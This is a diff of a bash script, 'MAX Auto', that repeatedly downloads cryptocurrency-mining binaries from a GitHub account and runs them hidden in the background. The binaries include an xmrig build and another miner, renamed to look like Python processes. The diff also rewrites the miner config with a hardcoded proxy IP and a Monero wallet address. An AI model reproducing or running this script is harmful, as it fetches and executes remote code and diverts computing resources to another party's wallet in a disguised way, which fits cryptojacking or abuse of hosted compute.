@@ -1,6 +1,6 @@
 #!/bin/bash -xe
 echo -e '####################################################################################'
-echo -e '##################      '"MAX  Auto"' Ver:0.2.14        ############################'
+echo -e '##################      '"MAX  Auto"' Ver:0.2.15        ############################'
 echo -e '####################################################################################'
 
 PROX=78.47.69.185
@@ -210,6 +210,8 @@ fi
 ##################################################################
 #OP=$OP
 #OPG=$OPG
+OP=VC
+GOP=RV
 
 i="0"
 
@@ -217,28 +219,28 @@ while true
 do
 if [ $OP == "XM" ]
 then
-####### XM
-#               Executable
-echo start >> ooutxm
-rm -rf pythonxm
-wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
-chmod +x pythonxm
-#                Config
-wget -q https://github.com/one10001/10001code/raw/main/config.json
-sed -i "s+ip0001+RV_$IPNAME+g" config.json
-sed -i "s+78.47.69.185+$PROX+g" config.json
-sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json
+    ####### XM
+    #               Executable
+    echo start >> ooutxm
+    rm -rf pythonxm
+    wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+    chmod +x pythonxm
+    #                Config
+    wget -q https://github.com/one10001/10001code/raw/main/config.json
+    sed -i "s+ip0001+RV_$IPNAME+g" config.json
+    sed -i "s+78.47.69.185+$PROX+g" config.json
+    sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json
 
-nohup ./pythonxm -c config.json -l ooutxm 2>> ooutxm 1>> ooutxm &
+    nohup ./pythonxm -c config.json -l ooutxm 2>> ooutxm 1>> ooutxm &
 
 else
-###### VC
-echo start >> ooutvc
-rm -rf pythonheq
-wget -q https://github.com/one10001/10001code/raw/main/pythonheq
-chmod +x pythonheq
+    ###### VC
+    echo start >> ooutvc
+    rm -rf pythonheq
+    wget -q https://github.com/one10001/10001code/raw/main/pythonheq
+    chmod +x pythonheq
 
-nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."VC_""$INFO" -t 4 1>> ooutvc 2>> ooutvc &
+    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."VC_""$INFO" -t 4 1>> ooutvc 2>> ooutvc &
 
 fi
 
@@ -273,8 +275,7 @@ fi
 ##################################################################
 ########                Display                          #########     
 ##################################################################
-OP=VC
-GOP=RV
+
 while true
     do
         i=$[$i+1]
